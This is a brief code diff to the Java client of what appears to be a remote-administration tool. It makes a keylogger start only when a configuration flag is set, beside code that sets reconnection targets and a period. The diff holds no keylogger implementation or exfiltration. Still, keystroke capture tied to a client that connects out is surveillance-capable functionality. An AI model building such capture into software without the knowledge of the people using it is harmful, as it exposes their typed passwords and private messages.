@@ -68,7 +68,10 @@ public class Client {
 
 		log.debug("CVID: {}", Common.cvid);
 
-		Keylogger.start(RefreshMethod.TIME, 20000);
+		if (ic.getKeylogger()) {
+			// TODO set parameters
+			Keylogger.start(RefreshMethod.TIME, 20000);
+		}
 
 		ClientStore.Connections.setTargets(ic.getTargetList());
 		ClientStore.Connections.setPeriod(ic.getReconnectPeriod());
